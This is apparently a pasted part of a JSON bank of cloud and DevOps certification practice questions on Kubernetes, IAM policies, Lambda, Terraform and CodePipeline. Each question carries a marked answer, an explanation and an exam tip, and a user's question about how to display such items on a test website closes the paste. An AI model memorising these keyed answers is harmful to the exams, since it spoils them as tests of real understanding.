+      "question": "A DevOps engineer is troubleshooting performance issues with a containerized application running on Kubernetes. Users report that the application occasionally becomes unresponsive for short periods. The engineer examines the following pod logs:\n\n```\n2023-05-18T09:31:45.123Z INFO  [app] Handling request /api/data/query\n2023-05-18T09:31:45.234Z INFO  [app] Connecting to cache service\n2023-05-18T09:31:45.236Z INFO  [app] Cache connection established\n2023-05-18T09:31:45.237Z INFO  [app] Cache miss for key 'user:preferences:12345'\n2023-05-18T09:31:45.238Z INFO  [app] Querying database for data\n2023-05-18T09:31:45.543Z INFO  [app] Database query completed in 305ms\n2023-05-18T09:31:45.544Z INFO  [app] Storing data in cache\n2023-05-18T09:31:45.546Z INFO  [app] Response sent in 423ms\n\n2023-05-18T09:35:12.678Z INFO  [app] Handling request /api/data/query\n2023-05-18T09:35:12.789Z INFO  [app] Connecting to cache service\n2023-05-18T09:35:14.012Z WARN  [app] Cache connection timeout after 1200ms\n2023-05-18T09:35:14.013Z INFO  [app] Falling back to database query\n2023-05-18T09:35:14.318Z INFO  [app] Database query completed in 305ms\n2023-05-18T09:35:14.319Z INFO  [app] Response sent in 1641ms\n\n2023-05-18T09:44:23.456Z INFO  [app] Handling request /api/data/query\n2023-05-18T09:44:23.567Z INFO  [app] Connecting to cache service\n2023-05-18T09:44:23.568Z INFO  [app] Cache connection established\n2023-05-18T09:44:23.570Z INFO  [app] Cache hit for key 'user:preferences:12345'\n2023-05-18T09:44:23.571Z INFO  [app] Response sent in 115ms\n```\n\nThe engineer also examines the pod and service definitions for the cache service:\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cache-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cache-service\n  template:\n    metadata:\n      labels:\n        app: cache-service\n    spec:\n      containers:\n      - name: redis\n        image: redis:6.2\n        resources:\n          requests:\n            memory: \"256Mi\"\n            cpu: \"100m\"\n          limits:\n            memory: \"256Mi\"\n            cpu: \"200m\"\n        ports:\n        - containerPort: 6379\n        livenessProbe:\n          tcpSocket:\n            port: 6379\n          initialDelaySeconds: 30\n          periodSeconds: 10\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: cache-service\nspec:\n  selector:\n    app: cache-service\n  ports:\n  - port: 6379\n    targetPort: 6379\n```\n\nWhat is the most likely cause of the intermittent unresponsiveness?",
+      "options": [
+        "Insufficient CPU allocation causing periodic throttling of the cache service",
+        "Memory pressure leading to Redis eviction of cache keys",
+        "Single replica of the cache service causing downtime during pod restarts",
+        "Network congestion between application pods and the cache service"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The single replica of the cache service causing downtime during pod restarts is the most likely cause of the intermittent unresponsiveness. The logs show periodic cache connection timeouts with messages like \"Cache connection timeout after 1200ms\" followed by fallbacks to the database. This pattern indicates that the cache service is occasionally unavailable. The deployment configuration shows that the cache service has only one replica (`replicas: 1`), meaning that during any maintenance, node failures, or pod restarts (which could be triggered by the liveness probe), there would be a period where the cache service is unavailable. This directly explains the pattern seen in the logs where the application occasionally can't connect to the cache. Insufficient CPU allocation would typically cause slower response times rather than complete connection timeouts. The logs don't indicate memory pressure or eviction issues - cache hits and misses are both processed normally when the service is available. Network congestion would typically manifest as consistently elevated latencies rather than complete connection failures, and would affect all services, not just the cache service.",
+      "examTip": "When troubleshooting intermittent service unavailability in Kubernetes, check the deployment replica count—stateful services like caches with only one replica will experience complete unavailability during pod restarts or node maintenance, causing temporary outages that appear as connection timeouts to clients."
+    },
+    {
+      "id": 93,
+      "question": "A security team is conducting a review of IAM policies in their AWS environment. They discover the following policy attached to a role used by several application servers:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowS3Access\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:PutObject\",\n        \"s3:DeleteObject\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::app-config-bucket/*\",\n        \"arn:aws:s3:::app-data-bucket/*\"\n      ]\n    },\n    {\n      \"Sid\": \"AllowSecretsAccess\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"secretsmanager:GetSecretValue\"\n      ],\n      \"Resource\": [\n        \"arn:aws:secretsmanager:*:123456789012:secret:app/*\"\n      ]\n    },\n    {\n      \"Sid\": \"AllowKMSAccess\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"kms:Decrypt\"\n      ],\n      \"Resource\": [\n        \"*\"\n      ],\n      \"Condition\": {\n        \"StringLike\": {\n          \"kms:ViaService\": [\n            \"secretsmanager.*.amazonaws.com\",\n            \"s3.*.amazonaws.com\"\n          ]\n        }\n      }\n    },\n    {\n      \"Sid\": \"AllowRoleAssumption\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"sts:AssumeRole\"\n      ],\n      \"Resource\": [\n        \"arn:aws:iam::123456789012:role/app-*\"\n      ]\n    }\n  ]\n}\n```\n\nWhich statement in this policy presents the highest security risk according to the principle of least privilege?",
+      "options": [
+        "The S3 statement allows DeleteObject actions on all objects in the buckets",
+        "The Secrets Manager statement allows access to all secrets with the 'app/' prefix",
+        "The KMS statement allows Decrypt operations on any KMS key in any region",
+        "The STS statement allows assuming any role with the 'app-' prefix"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The KMS statement allowing Decrypt operations on any KMS key in any region presents the highest security risk. The statement uses \"Resource\": [\"*\"], which means it applies to all KMS keys in the account, not just those used for the specific applications. While there is a condition limiting usage through the secretsmanager and s3 services, this doesn't restrict which keys can be used - only that they must be used via those services. This overly permissive access could allow decryption of sensitive data encrypted with any key in the account, as long as the access occurs through the specified services. The S3 statement is appropriately scoped to specific buckets, and while DeleteObject is a powerful permission, it's limited to the application's own buckets. The Secrets Manager statement is restricted to secrets with the 'app/' prefix, which is a reasonable scope for application secrets. The STS statement allowing role assumption is limited to roles with the 'app-' prefix within the same account, which represents a controlled scope for role chaining within application components.",
+      "examTip": "When auditing IAM policies, pay special attention to statements with 'Resource': '*' even when conditions are present—conditions limit how resources can be accessed but don't restrict which specific resources are accessible, potentially allowing unintended access to sensitive resources that match the condition patterns."
+    },
+    {
+      "id": 94,
+      "question": "A cloud engineer is investigating performance issues with a Lambda function that processes messages from an SQS queue. Users report that message processing is slower than expected and occasionally times out. The engineer collects the following metrics and logs:\n\n**Lambda Metrics:**\n- Average Duration: 4200ms (increasing from previous 1500ms)\n- Max Memory Used: 512MB out of 1024MB allocated\n- Throttled Invocations: 0\n- Concurrent Executions: 35 (well below the account limit)\n\n**SQS Metrics:**\n- ApproximateNumberOfMessages: Fluctuating between 500-2000\n- ApproximateAgeOfOldestMessage: Increasing from 30s to 180s\n\n**Lambda Logs:**\n```\n2023-05-20T14:32:45.123Z START RequestId: 32a9d159-f8b0-4980-a721-523e0ffa389c Version: $LATEST\n2023-05-20T14:32:45.124Z 2023-05-20T14:32:45.124Z INFO Received message: {\"id\":\"msg-12345\",\"payload\":{...}}\n2023-05-20T14:32:45.125Z 2023-05-20T14:32:45.125Z INFO Connecting to database\n2023-05-20T14:32:47.326Z 2023-05-20T14:32:47.326Z INFO Database connection established\n2023-05-20T14:32:47.327Z 2023-05-20T14:32:47.327Z INFO Querying customer record\n2023-05-20T14:32:48.115Z 2023-05-20T14:32:48.115Z INFO Retrieved customer record in 788ms\n2023-05-20T14:32:48.116Z 2023-05-20T14:32:48.116Z INFO Processing message data\n2023-05-20T14:32:48.593Z 2023-05-20T14:32:48.593Z INFO Message processing completed\n2023-05-20T14:32:48.594Z 2023-05-20T14:32:48.594Z INFO Updating database with results\n2023-05-20T14:32:49.217Z 2023-05-20T14:32:49.217Z INFO Database update completed\n2023-05-20T14:32:49.218Z END RequestId: 32a9d159-f8b0-4980-a721-523e0ffa389c\n2023-05-20T14:32:49.218Z REPORT RequestId: 32a9d159-f8b0-4980-a721-523e0ffa389c Duration: 4095 ms Billed Duration: 4100 ms Memory Size: 1024 MB Max Memory Used: 512 MB Init Duration: 321.85 ms\n```\n\nThe Lambda function is configured with the following settings:\n\n```json\n{\n  \"FunctionName\": \"ProcessSQSMessages\",\n  \"Runtime\": \"nodejs16.x\",\n  \"MemorySize\": 1024,\n  \"Timeout\": 30,\n  \"Environment\": {\n    \"Variables\": {\n      \"DB_HOST\": \"database-instance.example.com\",\n      \"DB_NAME\": \"customer_database\"\n    }\n  },\n  \"EventSourceMappings\": [\n    {\n      \"EventSourceArn\": \"arn:aws:sqs:us-east-1:123456789012:processing-queue\",\n      \"BatchSize\": 1,\n      \"MaximumBatchingWindowInSeconds\": 0\n    }\n  ]\n}\n```\n\nWhat change would most effectively improve the performance of this message processing system?",
+      "options": [
+        "Increase the Lambda function memory allocation to improve CPU performance",
+        "Modify the event source mapping to use a larger batch size for processing multiple messages",
+        "Implement connection pooling to reuse database connections across invocations",
+        "Enable provisioned concurrency to eliminate cold start latency"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Implementing connection pooling to reuse database connections across invocations would most effectively improve performance. The logs clearly show that establishing a database connection is consuming a significant portion of the execution time - approximately 2.2 seconds (from 45.125Z to 47.326Z) out of the total 4.1 seconds. This connection setup is happening for every single message processed. By implementing connection pooling, the function could maintain persistent connections in the global scope outside the handler function, avoiding the expensive connection establishment for each invocation. The Lambda metrics show that memory utilization is only at 50% of the allocated amount (512MB used out of 1024MB), so increasing memory would likely not significantly improve performance. The primary bottleneck appears to be the database connection time, not CPU or memory constraints. Modifying the batch size would process multiple messages per invocation, but each message would still incur the connection establishment overhead unless connection pooling is implemented. The logs don't indicate cold start issues (Init Duration is only 321ms), so provisioned concurrency wouldn't address the main performance bottleneck of repeated database connection establishment.",
+      "examTip": "When optimizing Lambda functions that interact with databases, examine the time spent establishing connections—implementing connection pooling that reuses connections across invocations often provides dramatic performance improvements compared to other optimizations, particularly when connection establishment represents a significant portion of the total execution time."
+    },
+    {
+      "id": 95,
+      "question": "A cloud engineer is implementing a serverless e-commerce application on AWS. The application needs to process orders, update inventory, and notify customers about order status. The engineer designs the following architecture:\n\n```\nAPI Gateway → Lambda (Process Order) → SQS (Order Queue) → Lambda (Inventory Update) → DynamoDB\n                                          ↓\n                                      SNS (Order Notifications) → Lambda (Email Notification)\n                                                                → Lambda (SMS Notification)\n```\n\nThe engineer implements the following Lambda function to process orders:\n\n```javascript\nconst AWS = require('aws-sdk');\nconst sqs = new AWS.SQS();\nconst sns = new AWS.SNS();\n\nexports.handler = async (event) => {\n  try {\n    // Extract order details from API Gateway event\n    const orderDetails = JSON.parse(event.body);\n    \n    // Validate order\n    if (!orderDetails.customerId || !orderDetails.items || orderDetails.items.length === 0) {\n      return {\n        statusCode: 400,\n        body: JSON.stringify({ message: 'Invalid order details' })\n      };\n    }\n    \n    // Generate order ID\n    const orderId = 'ORD-' + Date.now() + '-' + Math.floor(Math.random() * 1000);\n    orderDetails.orderId = orderId;\n    orderDetails.orderStatus = 'PENDING';\n    orderDetails.timestamp = new Date().toISOString();\n    \n    // Send to SQS for inventory processing\n    await sqs.sendMessage({\n      QueueUrl: process.env.ORDER_QUEUE_URL,\n      MessageBody: JSON.stringify(orderDetails),\n      MessageGroupId: orderDetails.customerId  // For FIFO queues\n    }).promise();\n    \n    // Publish to SNS for notifications\n    await sns.publish({\n      TopicArn: process.env.ORDER_TOPIC_ARN,\n      Message: JSON.stringify(orderDetails),\n      MessageAttributes: {\n        'orderStatus': {\n          DataType: 'String',\n          StringValue: 'PENDING'\n        }\n      }\n    }).promise();\n    \n    // Return success response\n    return {\n      statusCode: 200,\n      body: JSON.stringify({\n        message: 'Order processed successfully',\n        orderId: orderId\n      })\n    };\n  } catch (error) {\n    console.error('Error processing order:', error);\n    return {\n      statusCode: 500,\n      body: JSON.stringify({ message: 'Error processing order' })\n    };\n  }\n};\n```\n\nWhich architectural concern is NOT adequately addressed in this implementation?",
+      "options": [
+        "Order idempotency to prevent duplicate order processing",
+        "Error handling for failed SNS or SQS operations",
+        "Message persistence if the inventory update Lambda fails",
+        "Order data consistency across the distributed components"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "Order idempotency to prevent duplicate order processing is not adequately addressed in this implementation. The function generates order IDs based on the current timestamp and a random number (`orderId = 'ORD-' + Date.now() + '-' + Math.floor(Math.random() * 1000)`), but doesn't implement any mechanism to prevent or detect duplicate order submissions. If a customer submits the same order multiple times (due to UI issues, network problems, or deliberate action), each submission would generate a unique order ID and be processed as a new order, potentially causing duplicate charges, inventory updates, and notifications. Proper idempotency would require generating or accepting a client-provided idempotency key and checking for previous processing before proceeding. Error handling for failed SNS or SQS operations is addressed through the try/catch block that catches and logs errors, providing an appropriate error response to the client. Message persistence if the inventory update Lambda fails is inherently addressed by using SQS, which will retain messages until successfully processed, with configurable retry behavior and dead-letter queues. Order data consistency across distributed components is maintained through the use of orderId as a correlation identifier that's included in both the SQS message and SNS notification, allowing the various components to reference the same order.",
+      "examTip": "When designing distributed serverless architectures, implement idempotency controls at the request processing layer—particularly for financial transactions like order processing, where duplicate submissions could lead to significant business impact through double-charging or inventory miscalculations."
+    },
+    {
+      "id": 96,
+      "question": "A cloud architect is designing a solution to migrate a legacy application to the cloud. The application is a monolithic Java application running on-premises with these characteristics:\n\n- Uses Oracle Database with several stored procedures and complex joins\n- Performs batch processing of financial data overnight\n- Has stringent security and compliance requirements\n- Requires 99.9% availability during business hours\n- Has seasonal traffic patterns with 3x load during tax season\n\nThe architect is evaluating the following migration approaches:\n\n1. Rehost (lift and shift)\n2. Replatform (lift and optimize)\n3. Refactor (re-architect)\n4. Rebuild (rewrite)\n\nThe business has the following constraints:\n- Migration must be completed within 6 months\n- Disruption to users must be minimal\n- Future operational costs should be optimized\n- Application must maintain current security posture\n\nBased on these requirements and constraints, which migration approach should the architect recommend?",
+      "options": [
+        "Rehost using VMs in the cloud with automated scaling configurations",
+        "Replatform by migrating to managed PaaS services while retaining the application architecture",
+        "Refactor into microservices using containers and serverless components",
+        "Rebuild the application as cloud-native using modern frameworks and databases"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Replatforming (lift and optimize) by migrating to managed PaaS services while retaining the application architecture is the most appropriate approach given the requirements and constraints. This approach strikes the optimal balance between the 6-month timeline, minimal disruption, and cost optimization goals. Replatforming allows the organization to leverage managed services (like managed database services, application hosting platforms) that reduce operational overhead while preserving the core application architecture, avoiding the risks of a complete redesign. The complex Oracle database with stored procedures can be migrated to a compatible managed database service, preserving functionality while shifting maintenance responsibilities to the cloud provider. The monolithic nature of the application is maintained, eliminating the extensive redesign and testing that would be required in a refactoring approach. Rehosting (lift and shift) would meet the timeline and minimal disruption requirements but would miss opportunities for cost optimization through managed services, essentially carrying over the same operational overhead to the cloud. Refactoring into microservices would provide the best long-term benefits for scalability and cost optimization but would almost certainly exceed the 6-month timeline and introduce significant disruption risk due to the comprehensive architectural changes required. Rebuilding the application would involve the highest risk, longest timeline, and most potential for disruption, making it unsuitable given the constraints.",
+      "examTip": "When evaluating migration approaches, balance immediate business constraints against long-term architectural benefits—replatforming often provides the best middle ground for complex legacy applications with tight migration timelines, offering incremental improvements through managed services without the risks of complete architectural redesign."
+    },
+    {
+      "id": 97,
+      "question": "A DevOps engineer is implementing infrastructure as code (IaC) for a multi-tier application that will be deployed across development, staging, and production environments. The infrastructure includes VPC, subnets, security groups, load balancers, EC2 instances, and RDS databases. The engineer has created the following Terraform module structure:\n\n```\n├── environments/\n│   ├── dev/\n│   │   └── main.tf\n│   ├── staging/\n│   │   └── main.tf\n│   └── prod/\n│       └── main.tf\n├── modules/\n│   ├── networking/\n│   │   ├── main.tf\n│   │   ├── variables.tf\n│   │   └── outputs.tf\n│   ├── compute/\n│   │   ├── main.tf\n│   │   ├── variables.tf\n│   │   └── outputs.tf\n│   ├── database/\n│   │   ├── main.tf\n│   │   ├── variables.tf\n│   │   └── outputs.tf\n│   └── security/\n│       ├── main.tf\n│       ├── variables.tf\n│       └── outputs.tf\n└── terraform.tfvars\n```\n\nThe contents of the main.tf file in the prod environment directory are as follows:\n\n```hcl\nmodule \"networking\" {\n  source = \"../../modules/networking\"\n  vpc_cidr = \"10.0.0.0/16\"\n  environment = \"prod\"\n}\n\nmodule \"security\" {\n  source = \"../../modules/security\"\n  vpc_id = module.networking.vpc_id\n  environment = \"prod\"\n  bastion_allowed_cidr = [\"203.0.113.0/24\"]\n}\n\nmodule \"compute\" {\n  source = \"../../modules/compute\"\n  vpc_id = module.networking.vpc_id\n  subnet_ids = module.networking.private_subnet_ids\n  security_group_id = module.security.app_security_group_id\n  environment = \"prod\"\n  instance_type = \"m5.large\"\n  instance_count = 4\n}\n\nmodule \"database\" {\n  source = \"../../modules/database\"\n  subnet_ids = module.networking.database_subnet_ids\n  security_group_id = module.security.db_security_group_id\n  environment = \"prod\"\n  instance_class = \"db.m5.large\"\n  multi_az = true\n  backup_retention_period = 30\n}\n```\n\nWhich improvement to this Terraform structure would best follow infrastructure as code best practices for maintainability and consistency across environments?",
+      "options": [
+        "Implement remote state storage with locking to enable team collaboration",
+        "Consolidate all environment configurations into a single parameterized module",
+        "Refactor environment-specific values into variable files for each environment",
+        "Implement a CI/CD pipeline that validates and applies Terraform changes"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Refactoring environment-specific values into variable files for each environment would best follow infrastructure as code best practices for maintainability and consistency. The current implementation hardcodes various environment-specific parameters directly in the main.tf files (like CIDR ranges, instance types, and counts), which creates several issues: it makes it difficult to track environment differences, increases the risk of configuration drift between environments, and makes changes more error-prone as values must be manually updated in multiple places. By moving these environment-specific values into dedicated variable files (e.g., dev.tfvars, staging.tfvars, prod.tfvars), the environment configurations become more transparent, consistent, and maintainable. The main.tf files can then reference these variables instead of hardcoding values, ensuring that the same architectural patterns are applied consistently across environments while only the necessary values differ. Remote state storage with locking is important for team collaboration but doesn't directly address the consistency and maintainability of the environment configurations. Consolidating all environments into a single parameterized module would reduce the ability to manage environments independently and could create more complex module interactions. Implementing a CI/CD pipeline for Terraform is valuable for workflow automation but doesn't solve the underlying configuration consistency issues.",
+      "examTip": "When implementing infrastructure as code across multiple environments, separate configuration from code by moving environment-specific values into dedicated variable files—this improves maintainability by making environment differences explicit and reduces the risk of configuration drift by ensuring consistent infrastructure patterns."
+    },
+    {
+      "id": 98,
+      "question": "A cloud operations team is implementing a secure and scalable solution for accessing and managing their AWS resources. The organization has the following requirements:\n\n1. Engineers must authenticate with their corporate identities\n2. Access to production must require multi-factor authentication\n3. No long-term AWS access keys should be generated for human users\n4. Limited-time elevated access for specific troubleshooting tasks\n5. All access must be logged and auditable\n\nThe team creates the following architecture:\n\n```\nCorporate Identity Provider → AWS IAM Identity Center → AWS Organizations\n       ↑                           ↓\n       |                      Permission Sets\n       |                           ↓\n Multi-Factor                AWS Accounts\n Authentication                   ↓\n                             IAM Roles\n```\n\nThe team implements the following AWS CLI configuration for engineers:\n\n```ini\n[profile default]\nregion = us-west-2\nsso_start_url = https://company.awsapps.com/start\nsso_region = us-west-2\nsso_account_id = 123456789012\nsso_role_name = ReadOnlyAccess\n\n[profile dev-admin]\nregion = us-west-2\nsso_start_url = https://company.awsapps.com/start\nsso_region = us-west-2\nsso_account_id = 111111111111\nsso_role_name = DeveloperAccess\n\n[profile prod-readonly]\nregion = us-west-2\nsso_start_url = https://company.awsapps.com/start\nsso_region = us-west-2\nsso_account_id = 222222222222\nsso_role_name = ReadOnlyAccess\n```\n\nWhich additional component would complete this architecture to address all the requirements?",
+      "options": [
+        "AWS IAM Access Analyzer to detect policy issues and unused permissions",
+        "CloudTrail with multi-region logging to centralize all authentication events",
+        "AWS CloudFormation StackSets to deploy consistent permissions across accounts",
+        "Privileged access management system for temporary elevated access requests"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "A privileged access management system for temporary elevated access requests would complete the architecture to address all requirements. The current architecture addresses most requirements: corporate identity integration through IAM Identity Center, MFA enforcement, avoidance of long-term access keys by using SSO for short-term credentials, and basic role-based access. However, it's missing a solution for requirement #4: limited-time elevated access for specific troubleshooting tasks. A privileged access management system would provide the just-in-time privilege elevation capability needed, allowing engineers to request temporary elevated access with appropriate approvals, automatic time limitations, and detailed activity logging during the elevated access period. This completes the zero standing privilege model while enabling necessary operations work. AWS IAM Access Analyzer would help optimize permissions but doesn't provide the temporary access elevation capability required. CloudTrail with multi-region logging would improve the audit logging but the base requirement for logging is already addressed by default CloudTrail and IAM Identity Center logs, and it doesn't provide the elevated access management needed. CloudFormation StackSets would help with permission consistency but doesn't address the temporary elevated access requirement.",
+      "examTip": "When designing identity and access management architectures for cloud environments, include just-in-time privilege elevation mechanisms through privileged access management systems—this allows implementing zero standing privileges while still enabling operations teams to perform necessary administration tasks through time-limited, approved access elevations."
+    },
+    {
+      "id": 99,
+      "question": "A cloud engineer is implementing a high-performance data processing pipeline in AWS. The pipeline ingests data from multiple sources, transforms it, and loads it into a data warehouse for analysis. The engineer implements the following architecture:\n\n```\n                                        ┌─────────────┐\n                                        │             │\n                         ┌─────────────►  Firehose   ├─────────┐\n                         │              │             │         │\n┌──────────┐    ┌────────────────┐    └─────────────┘    ┌────▼─────┐\n│          │    │                │                         │          │\n│  Kinesis ├────►   Lambda      │                         │    S3    │\n│          │    │                │                         │          │\n└──────────┘    └───────┬────────┘                        └────┬─────┘\n                         │                                      │\n                         │         ┌─────────────┐             │\n                         │         │             │             │\n                         └────────►│    SQS     ├─────────────┘\n                                   │             │             │\n                                   └──────┬──────┘             │\n                                          │                    │\n                            ┌─────────────▼──────────┐        │\n                            │                         │        │\n                            │     Batch Processing    │◄───────┘\n                            │         Cluster         │\n                            │                         │\n                            └─────────────┬───────────┘\n                                          │\n                                          │\n                              ┌───────────▼─────────┐\n                              │                      │\n                              │   Data Warehouse    │\n                              │                      │\n                              └──────────────────────┘\n```\n\nThe pipeline is experiencing intermittent performance issues. During investigation, the engineer discovers that data processing times are inconsistent, with some batches taking significantly longer than others to complete. The following metrics are observed:\n\n- Kinesis: No throttling events, consistent shard utilization\n- Lambda: Occasional timeouts during peak loads\n- Firehose: No delivery issues, consistent throughput\n- SQS: Message age occasionally reaches 10+ minutes before processing\n- Batch Processing Cluster: CPU utilization varies between 30-95%\n\nWhich architectural change would most effectively improve the consistency of the data processing pipeline?",
+      "options": [
+        "Implement Kinesis Enhanced Fan-Out for dedicated throughput to Lambda consumers",
+        "Replace SQS with a Kinesis Data Stream to better handle processing backlogs",
+        "Decouple the Lambda and SQS interaction by using SNS as an intermediary",
+        "Add auto-scaling to the batch processing cluster based on SQS queue depth"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Adding auto-scaling to the batch processing cluster based on SQS queue depth would most effectively improve the consistency of the data processing pipeline. The metrics show that SQS message age occasionally reaches 10+ minutes before processing, while the batch processing cluster's CPU utilization varies widely between 30-95%. This indicates that the batch processing cluster doesn't have sufficient capacity during peak periods, leading to messages waiting in the queue. By implementing auto-scaling based on SQS queue depth (or message age), the system would dynamically adjust processing capacity based on actual workload, ensuring consistent processing times regardless of incoming data volume. Implementing Kinesis Enhanced Fan-Out would improve Lambda's consumption of Kinesis data, but the metrics don't indicate issues at this stage of the pipeline (no throttling events, consistent shard utilization). Replacing SQS with another Kinesis Data Stream would add complexity without addressing the actual bottleneck, which appears to be at the batch processing stage. Decoupling Lambda and SQS with SNS would add unnecessary complexity since the issue isn't with the message routing but with the processing capacity relative to the incoming message volume.",
+      "examTip": "When optimizing data processing pipelines, closely examine metrics across each component to identify bottlenecks—message age in queuing systems combined with variable CPU utilization in processing clusters often indicates a scaling mismatch that can be addressed through auto-scaling based on queue metrics rather than just CPU utilization."
+    },
+    {
+      "id": 100,
+      "question": "A company is deploying a multi-tier web application in AWS using infrastructure as code. The application consists of web servers, application servers, and a database tier. The deployment automation team has implemented the following CI/CD pipeline in AWS CodePipeline:\n\n```yaml\nPipeline:\n  - Name: Source\n    Actions:\n      - Name: Source\n        ActionTypeId:\n          Category: Source\n          Owner: AWS\n          Provider: CodeCommit\n          Version: '1'\n        Configuration:\n          RepositoryName: application-code\n          BranchName: main\n\n  - Name: InfrastructureBuild\n    Actions:\n      - Name: CloudFormationValidate\n        ActionTypeId:\n          Category: Test\n          Owner: AWS\n          Provider: CodeBuild\n          Version: '1'\n        Configuration:\n          ProjectName: cf-validate-project\n\n  - Name: InfrastructureDeploy\n    Actions:\n      - Name: DeployNetwork\n        ActionTypeId:\n          Category: Deploy\n          Owner: AWS\n          Provider: CloudFormation\n          Version: '1'\n        Configuration:\n          TemplatePath: Source::network.yaml\n          RoleArn: arn:aws:iam::123456789012:role/CloudFormationRole\n          StackName: network-stack\n          Capabilities: CAPABILITY_IAM\n\n      - Name: DeployDatabase\n        ActionTypeId:\n          Category: Deploy\n          Owner: AWS\n          Provider: CloudFormation\n          Version: '1'\n        Configuration:\n          TemplatePath: Source::database.yaml\n          RoleArn: arn:aws:iam::123456789012:role/CloudFormationRole\n          StackName: database-stack\n        RunOrder: 2\n\n      - Name: DeployApplication\n        ActionTypeId:\n          Category: Deploy\n          Owner: AWS\n          Provider: CloudFormation\n          Version: '1'\n        Configuration:\n          TemplatePath: Source::application.yaml\n          RoleArn: arn:aws:iam::123456789012:role/CloudFormationRole\n          StackName: application-stack\n        RunOrder: 3\n\n  - Name: ApplicationDeploy\n    Actions:\n      - Name: DeployCode\n        ActionTypeId:\n          Category: Deploy\n          Owner: AWS\n          Provider: CodeDeploy\n          Version: '1'\n        Configuration:\n          ApplicationName: web-application\n          DeploymentGroupName: production-deployment-group\n```\n\nThe deployment initially works successfully, but the team encounters issues when making changes to the infrastructure. When updating the application.yaml template to add new application features, they find that changes sometimes fail or cause unexpected downtime. Which pipeline improvement would most effectively address these issues?",
+      "options": [
+        "Add a manual approval action before the InfrastructureDeploy stage",
+        "Implement a change set review and execution step for CloudFormation deployments",
+        "Create separate pipelines for infrastructure and application code deployments",
+        "Implement blue-green deployments for the application infrastructure"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Implementing a change set review and execution step for CloudFormation deployments would most effectively address the issues. Change sets are a CloudFormation feature that allows you to preview how proposed changes will impact existing resources before implementing them. By adding a change set creation, review, and execution step to the pipeline, the team would be able to see exactly which resources will be modified, replaced, or deleted before any changes are applied. This provides visibility into potential causes of failure or downtime, such as resources that need replacement rather than in-place updates, dependent resources that might be temporarily unavailable, or security group changes that could affect connectivity. The current pipeline applies changes directly without this preview step, leading to unexpected outcomes. A manual approval action would add human oversight but wouldn't provide any additional information about the potential impact of changes. Creating separate pipelines for infrastructure and application code would help organization but wouldn't address the underlying issue of understanding change impact before deployment. Blue-green deployments are effective for application code but are more complex to implement for infrastructure components and wouldn't necessarily provide insight into why specific changes are causing issues.",
+      "examTip": "When implementing infrastructure as code with CloudFormation, always include change set creation and review steps in your deployment pipeline—this provides critical visibility into exactly how your changes will impact existing resources before execution, helping prevent unexpected downtime or failures due to resource replacement or dependency issues."
+    }
+  ]
+});  
+
+
+
+
+
+so with allll that said (i know its alot of info) how/what is teh ebst way to mak the best possible viewer/etst taker expericne to vie /display these in depth pbq style questiosn WITHOUT affecting the nromal style questiosn aswell as NOT effecting any other components/ffeatures/fucntiosn of my webppage/testpages?? thanks
